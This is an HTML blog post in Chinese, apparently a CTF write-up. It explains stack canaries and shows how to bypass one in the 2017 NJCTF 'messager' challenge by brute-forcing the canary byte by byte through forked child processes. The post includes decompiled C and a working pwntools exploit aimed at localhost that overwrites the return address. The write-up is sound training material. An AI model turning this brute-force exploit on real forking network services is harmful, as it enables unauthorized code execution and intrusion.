@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Canary_leak | Unbelievable</title>
+
+
+    <meta name="keywords" content="Canary, Stack">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="Stack Canaries 前置知识原理 Stack canaries(取名自地下煤矿地金丝雀，因为它能提前发现煤气泄漏，有预警的作用)。用于对抗栈溢出攻击，即SSP安全机制，也叫Stack Cookie。Canary是栈上的一个随机数（大小与程序位数一样），当栈溢出攻击从低地址向高地址覆盖意图控制函数的返回指针时，就一定会先覆盖到Canary，这样程序只需在函数返回前检查Canary是否被篡改">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Canary_leak">
+<meta property="og:url" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/index.html">
+<meta property="og:site_name" content="Unbelievable">
+<meta property="og:description" content="Stack Canaries 前置知识原理 Stack canaries(取名自地下煤矿地金丝雀，因为它能提前发现煤气泄漏，有预警的作用)。用于对抗栈溢出攻击，即SSP安全机制，也叫Stack Cookie。Canary是栈上的一个随机数（大小与程序位数一样），当栈溢出攻击从低地址向高地址覆盖意图控制函数的返回指针时，就一定会先覆盖到Canary，这样程序只需在函数返回前检查Canary是否被篡改">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/1.png">
+<meta property="og:image" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/2.png">
+<meta property="og:image" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/3.png">
+<meta property="og:image" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/4.png">
+<meta property="article:published_time" content="2021-07-22T01:31:38.000Z">
+<meta property="article:modified_time" content="2021-07-22T05:18:38.651Z">
+<meta property="article:author" content="Tobe.Unbelievable">
+<meta property="article:tag" content="Canary">
+<meta property="article:tag" content="Stack">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://majikoo1028.github.io/2021/07/22/Canary-attack/1.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/tomorrow-night-eighties.css" media="none" onload="if(getComputedStyle(document.documentElement).getPropertyValue('--color-mode').indexOf('dark')===-1)this.media='all'">
+        
+    
+
+    
+    
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <div id="app">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Unbelievable</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/friends/" class="navbar-menu button">友链</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+
+         
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/friends/" class="dropdown-menu button">友链</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Canary_leak
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2021/07/" class="post-meta__date button">2021-07-22</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Canaries-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Stack Canaries 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary%E9%80%9A%E5%B8%B8%E5%88%86%E4%B8%89%E7%B1%BB%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">Canary通常分三类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E7%9A%84TLS%E5%8F%8Acanary"><span class="toc-number">1.3.</span> <span class="toc-text">Linux下的TLS及canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBCanarie"><span class="toc-number">2.</span> <span class="toc-text">攻击Canarie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A2017-NJCTF-messager"><span class="toc-number">2.1.</span> <span class="toc-text">实例一：2017 NJCTF messager</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Canaries-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Stack Canaries 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary%E9%80%9A%E5%B8%B8%E5%88%86%E4%B8%89%E7%B1%BB%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">Canary通常分三类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E7%9A%84TLS%E5%8F%8Acanary"><span class="toc-number">1.3.</span> <span class="toc-text">Linux下的TLS及canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBCanarie"><span class="toc-number">2.</span> <span class="toc-text">攻击Canarie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A2017-NJCTF-messager"><span class="toc-number">2.1.</span> <span class="toc-text">实例一：2017 NJCTF messager</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+
+
+<article class="post content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="Stack-Canaries-前置知识"><a href="#Stack-Canaries-前置知识" class="headerlink" title="Stack Canaries 前置知识"></a>Stack Canaries 前置知识</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
+<p>Stack canaries(取名自地下煤矿地金丝雀，因为它能提前发现煤气泄漏，有预警的作用)。用于对抗栈溢出攻击，即SSP安全机制，也叫Stack Cookie。Canary是栈上的一个随机数（大小与程序位数一样），当栈溢出攻击从低地址向高地址覆盖意图控制函数的返回指针时，就一定会先覆盖到Canary，这样程序只需在函数返回前检查Canary是否被篡改即可达到保护目的。</p>
+</blockquote>
+<h3 id="Canary通常分三类："><a href="#Canary通常分三类：" class="headerlink" title="Canary通常分三类："></a><strong>Canary</strong>通常分三类：</h3><ul>
+<li>Terminator canaries：低位设置为<code>&quot;\x00&quot;</code>，一定程度上防止字符串操作溢出泄露canary</li>
+<li>Random canaries：程序初始化时随机生成一个值作为canary</li>
+<li>Random XOR canarie：上面的random多个XOR操作，无论时canary还是XOR的数据被篡改都会报错</li>
+</ul>
+<h3 id="Linux下的TLS及canary"><a href="#Linux下的TLS及canary" class="headerlink" title="Linux下的TLS及canary"></a>Linux下的TLS及canary</h3><p><strong>fs寄存器</strong>一般用于指向TLS，TLS的结构体tcbhead_t（64位）中偏移0x28正指向stack_guard，一般检测栈溢出的过程就是，程序加载时glibc先初始化TLS，包括为其分配内存及设置fs寄存器指向TLS（这一部分由系统调用<code>arch_prcl完成</code>），然后调用<code>security_init()</code>函数生成Canary的值<code>stack_chk_guard</code>，并放入<strong>fs:0x28</strong>，检测的时候对比这个值是否发生变化。</p>
+<h2 id="攻击Canarie"><a href="#攻击Canarie" class="headerlink" title="攻击Canarie"></a>攻击Canarie</h2><p>核心思路就是避免程序崩溃抛错，有两种方式：</p>
+<ul>
+<li>将canaries的值泄露出来，栈溢出的时候覆盖上去使其保持不变（<strong>PS：Canaries的值一般在存放返回函数地址之前的8/4个字节上</strong>）</li>
+<li>同时篡改TLS和栈上的Canaries</li>
+</ul>
+<h3 id="实例一：2017-NJCTF-messager"><a href="#实例一：2017-NJCTF-messager" class="headerlink" title="实例一：2017 NJCTF messager"></a>实例一：2017 NJCTF messager</h3><p>查看基本信息</p>
+<p><img src="/2021/07/22/Canary-attack/1.png" alt="1"></p>
+<p>程序有个地方打开了flag文件,存放到一个变量中，查看交叉引用又找到了回送flag的函数（溢出返回的地址get）</p>
+<p><img src="/2021/07/22/Canary-attack/2.png" alt="2"><img src="/2021/07/22/Canary-attack/3.png" alt="3"></p>
+<p>自己写一个flag文件，修改一下messager的权限，打本地。</p>
+<p><img src="/2021/07/22/Canary-attack/4.png" alt="4"></p>
+<p>再看看主函数的一个循环</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);   <span class="comment">//每当收到连接时</span></span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> )                                       <span class="comment">// 就创建子进程</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    send(fd, <span class="string">&quot;Welcome!\n&quot;</span>, <span class="number">9uLL</span>, <span class="number">0</span>);</span><br><span class="line">    v5 = fork();                                </span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )                                         <span class="comment">//然后退出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+<p><strong>知识补充</strong></p>
+<blockquote>
+<p>当一个进程调用<code>fork()</code>复刻子进程时，系统会给子进程分配资源，并将父进程的所有值复制到子进程中，相当于克隆父进程。父进程中调用<code>fork()</code>返回子进程的pid，而子进程中调用<code>fork()</code>时返回值是0，失败则返回负值。</p>
+<p>一般来说canarie的值是没法直接爆破的，一是因为canarie的值范围大，二是因为爆破导致程序崩溃重启后的Canarie值可能又会重新随机生成。但是同一个进程包括复刻的子进程里的Canaries是不变的，而子进程的崩溃也不会影响父进程，这就有了可乘之机。</p>
+</blockquote>
+<p>溢出点在函数<code>sub_400Be9()</code>中，向0x64大小的变量存放之多0x400大小的数据</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400BE9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;csfd = %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)fd);</span><br><span class="line">  bzero(s, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)recv(fd, s, <span class="number">0x400</span>uLL, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;recv&quot;</span>);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message come: %s&quot;</span>, s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>综合分析下来exp就出来了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">&quot;\x00&quot;</span>                   <span class="comment"># canarie值低位字节固定不变</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)  <span class="comment"># 发起连接</span></span><br><span class="line">            io.recv()                     <span class="comment"># 接收&quot;Welcome!\n&quot;</span></span><br><span class="line"></span><br><span class="line">            io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(x))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.recv()                <span class="comment"># 接收&quot;Message received!\n&quot;</span></span><br><span class="line">                canary += <span class="built_in">chr</span>(x)          <span class="comment"># 逐字节进行爆破，若程序没崩溃则说明这个字节正确，退出for循环爆破下一字节</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                io.close()</span><br><span class="line">    log.info(<span class="string">&quot;canary: 0x%s&quot;</span> % canary.encode(<span class="string">&#x27;hex&#x27;</span>))   <span class="comment"># 打印正确的canaries</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + p64(<span class="number">0x400bc6</span>))</span><br><span class="line">    <span class="built_in">print</span> io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    leak_canary()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<p>《CTF竞赛权威指南（PWN篇）》</p>
+</blockquote>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>updated at 2021-07-22</p></div> 
+    <div class="post-meta__cats"><a href="/tags/Canary/" class="post-tags__link button"># Canary</a><a href="/tags/Stack/" class="post-tags__link button"># Stack</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/2021/07/15/wasm%E9%80%86%E5%90%91/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            wasm逆向
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+
+            <footer class="footer">
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <link rel="stylesheet" href="/live2d/css/live2d.css" />
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+        <div class="hide-button">隐藏</div>
+    </div>
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript">
+        var message_Path = '/live2d/'
+        var home_Path = 'https://unbelievable.cool/'
+    </script>
+    <script type="text/javascript" src="/live2d/js/live2d.js"></script>
+    <!--<script type="text/javascript" src="/live2d/js/message.js"></script>-->
+    <script type="text/javascript">
+        loadlive2d("live2d", "/live2d/model/shifuku/shifuku.model.json");
+    </script>
+        <p class="footer-copyright">
+            Copyright © 2021&nbsp;-&nbsp;2021 <a href="/">Unbelievable</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+  
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('true')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+
+    <script>
+        window.onload = () => {
+            document.querySelectorAll('.sliding-fold').forEach((item) => {
+                item.querySelector('summary').onclick = () => {
+                    item.classList.toggle("collapsed");
+                    item.classList.toggle("expanded");
+                };
+            });
+        };
+    </script>
+ 
+
+
+    
+
+    
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"3IAE9kFUvNz7NdN7PcECz4Xj-gzGzoHsz","appKey":"9EEiERWEkTIdpRtAlNy7160Q","placeholder":"冲！","path":null,"avatar":"hide","meta":["nick","mail","link"],"pageSize":null,"lang":null,"visitor":null,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+
+    </body>
+</html>
